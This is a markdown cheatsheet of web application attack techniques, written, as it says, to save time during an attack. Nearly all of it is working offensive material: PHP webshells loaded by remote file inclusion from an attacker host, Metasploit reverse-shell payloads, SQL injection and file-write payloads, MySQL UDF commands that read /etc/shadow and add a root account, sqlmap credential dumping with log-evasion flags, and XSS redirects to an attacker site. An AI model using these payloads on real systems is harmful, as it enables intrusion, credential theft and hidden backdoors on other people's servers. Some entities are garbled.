# Web Application exploitation - a cheatsheet
This is a work in progress. Additions, suggestions and constructive feedback are welcome.
The purpose of these cheatsheets is to, essentially, save time during an attack and study session.


## WebShell Backdoors
Minimal php command shells
file cmd.php: PHP script text =>
```

<?php system($_GET['cmd']) ?>
or
<?php system($_REQUEST['cmd']); ?>
Example usage via Remote File Include (RFI):
http://<target-ip>/index.php?cmd=<command to execute>&page=http://<attacker-ip>/cmd.php
Null Bytes (‰00 - html code ampersand, hash 137, 00) may also assist in some cases:
http://<target-ip>/index.php?cmd=<command to execute>&page=http://<attacker-ip>/cmd.php
‰
e.g.
http://<attacker-ip>/index.php?system=../../../../../etc/passwd.html
Encoding windows reverse command shell as asp
msfpayload windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<attacker-nc-port> R | msfencode -t asp -o <filename>.asp
Encoding meterpreter in asp
msfpayload windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<attacker-multi-handler-port> R | msfencode -t asp -o <filename>.asp
------
attacker msfconsole:
use multi/exploit/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker-ip>
set LPORT <attacker-multi-handler-port>
exploit

```

http://stackoverflow.com/questions/3115559/exploitable-php-functions


------------------------------------------------------------------------------------------------------------------
#### Encoding and Decoding - for backdoors, injection, and (de)obfustication
```

http://www.asciitohex.com/
http://home.paulschou.net/tools/xlate/
http://www.idea2ic.com/PlayWithJavascript/hexToAscii.html
```

Burp Suite (Decoder module)
```
http://portswigger.net/burp/help/decoder.html
```

Decode base64 standard input
```
base64 -d
<paste base-64 encoded text>
^D
```

Javascript deobfustication
```
http://www.javascriptbeautifier.com/
http://jsbeautifier.org/
http://vitzo.com/en/tools/javascript/javascript-beautifier
```

------------------------------------------------------------------------------------------------------------------
## Specific Web applications

#### Joomla
```
Joomla default database configuration filename
<web-app-path>/configuration.php
Scanning Joomla! for plugins and versions
/pentest/web/scanners/joomscan/joomscan.pl -u <target-and-joomla-path>
/pentest/enumeration/web/cms-explorer  -url <target-and-joomla-path> -type joomla
```

#### WordPress
```
WordPress default database configuration filename
<web-app-path>
WordPress default login page
<web-app-path>/wp-login.php
WordPress plugins
<web-app-path>/wp-content/plugins
Scanning WordPress for plugins and versions
/pentest/web/wpscan/wpscan.rb --url <target-and-wordpress-path&gt; --proxy <proxy-addr:port> -enumerate [u|p|v|t]
/pentest/enumeration/web/cms-explorer  -url <target-and-wordpress-path> -type wordpress
Newer WP: "Themes" can be uploaded as zip files by WP administrators i.e. you:
mkdir wpx
vi wpx/cmd.php
cat wpx/cmd.php
<?php system($_GET['cmd']) ?>
zip -r wpx.zip wpx
upload wpx.zip via web interface as an installed theme
Command execution access is via:
<web-app-path>/wp-content/plugins/wpx/cmd.php?cmd=<command(s)>
Older WP: Webshells can be added by editing exiting files/themes via the web interface or by enabling file upload and permitting the valid file extension (e.g. .php)
```

#### Cacti
Cacti default database configuration filename
```
<web-app-path>/include/config.php
```


#### DeV!Lz ClanPortal
```
DeV!L`z ClanPortal default database configuration filename
<web-app-path>/inc/mysql.php
```

#### Drupal

Drupal default database configuration filename
```
<web-app-path>/sites/default/settings.php
```

Scanning Drupal for plugins and versions
```
/pentest/enumeration/web/cms-explorer  -url <target-and-drupal-path> -type drupal
```
#### PHPMyAdmin
```
/phpmyadmin/changelog.php
```
#### Timeclock
Timeclock default database configuration filename
```
<web-app-path>/db.php
```


Default files to check for additional paths
```
lt;target-webpath>/robots.txt
lt;target-webpath>/style.css
```

------------------------------------------------------------------------------------------------------------------
#### SQL Terminators/Comments
MSSQL and MySQL:
```
<sql injected command>;--
```
MySQL:
```
<sql injected command>;#
```


#### Login Pages Basic SQL injection
MS IIS
```
' OR '1=1';--

```
MySQL
```
'OR 1=1;--
'OR 1=1;#
'OR 1=1 LIMIT 1;#
```

#### Enumerate number of columns/fields
```
...UNION SELECT 1;--
...UNION SELECT 1,2;--
...UNION SELECT 1,2,3;--
```

L#### oad file by injecting into the vulnerable field - encode string if necessary
```
…UNION ALL SELECT NULL,LOAD_FILE(‘<user-readable-file>’),NULL,NULL;-- …UNION ALL SELECT NULL,LOAD_FILE(‘<user-readable-file>’),NULL,NULL INTO OUTFILE ‘<writeable-path-or-web-directorygt;’;--
```

#### Dump/Write to file
```
(see encode text/shell to hex, base64)
...SELECT * FROM mytable INTO DUMPFILE ‘<writeable-path-or-web-directorygt;’; —
...SELECT * FROM mytable INTO OUTFILE ‘<writeable-path-or-web-directorygt;’; —
```

http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet

http://ferruh.mavituna.com/sql-injection-cheatsheet-oku

#### MySQL <5.0 User Defined Functions
command execution and privilege escalation with mysql running as root/SYSTEM
```
mysql> use mysql;
mysql> create table <table-name>(line blob);
Query OK, 0 rows affected (0.00 sec)
mysql> insert into <table-name> values(load_file('<path-to-udf.so-file>');
Query OK, 1 rows affected (0.00 sec)
mysql> select * from <table-name> into dumpfile '/usr/lib/lib_mysqludf_sys.so';
Query OK, 1 rows affected (0.00 sec)
mysql> create function <name_of_new_function> returns int soname 'lib_mysqludf_sys.so';
```
Example command execution with the new function:
```
mysql> set @status := <name_of_new_function>('cat /etc/shadow > /tmp/shadow');
Query OK, 0 rows affected (0.06 sec)
mysql> set @status := <name_of_new_function>('/usr/sbin/useradd -o -u0 -g0 -d /dev/null -s /bin/bash &new-username>');
Query OK, 0 rows affected (0.06 sec)
mysql> set @status := <name_of_new_function>('echo <new-username>:<chosen-password> | /usr/sbin/chpasswd');
Query OK, 0 rows affected (0.06 sec)
```
or
```
mysql> select <name_of_new_function>('/usr/sbin/useradd -o -u0 -g0 -d /dev/null -s /bin/bash &new-username>');
+----------------------------------------------------------------------------------------------------------------------------------------------------------+
| <name_of_new_function>('/usr/sbin/useradd -o -u0 -g0 -d /dev/null -s /bin/bash &new-username>'); |+----------------------------------------------------------------------------------------------------------------------------------------------------------+
| 4294967296                                                                                                                                       | +----------------------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (1.70 sec)
```
```
http://0x80.org/blog/?p=298
http://blog.encription.co.uk/privilege-escalation-using-mysql-user-defined-functions/
http://www.0xdeadbeef.info/exploits/raptor_udf.c
http://bernardodamele.blogspot.com.au/2009/01/command-execution-with-mysql-udf.html
```
#### SQLMap commands

```
cd /pentest/database/sqlmap

Retrieve SQL Banner, current database and current user; test if the user is the db administrator
./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" -p <injectable-parameter> --banner --current-db --current-user --is-dba

Enumerate User Passwords
./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" --passwords

List of Databases
./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" --dbs

Retrieve tables from specific Database
./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" --tables -D <database-name>

Dump specific table contents
./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" --dump -D <database-name> -T <table-name>

Retrieve system /etc/password file
./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" --file-read=/etc/passwd

Retrieve apache2 configuration file to identify live website config files
./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" --file-read=/etc/apache2/apache2.conf

Retrieve default configuration file to subsequently identify Document Root (web directory location)
./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" --file-read=/etc/apache2/sites-enabled/000-default

Retrieve CMS/Web app default configuration file if possible
./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" --file-read=<Document-root-path>/<Web-Application-Path>/<configuration-file>


Other interesting flags:
--check-waf         Check for existence of WAF/IPS/IDS protection - implementation of nmap http-waf-detect nse script


Some logfile Misdirection flags:
--random-agent      Use randomly selected HTTP User-Agent header
--safe-url=<target-normalised-URL>   Url address to visit frequently during testing
--safe-freq=<num-seconds>  Test requests between two visits to a given safe url
--mobile            Imitate smartphone through HTTP User-Agent header
```

------------------------------------------------------------------------------------------------------------------

## Basic Client-side attacks
#### XSS - iframe
```
<iframe src="http://<evil-site-address>" width="0" height="0"></iframe>
```


#### XSS - javascript

```
<script>document.location="<evil-site-address>";</script>
```
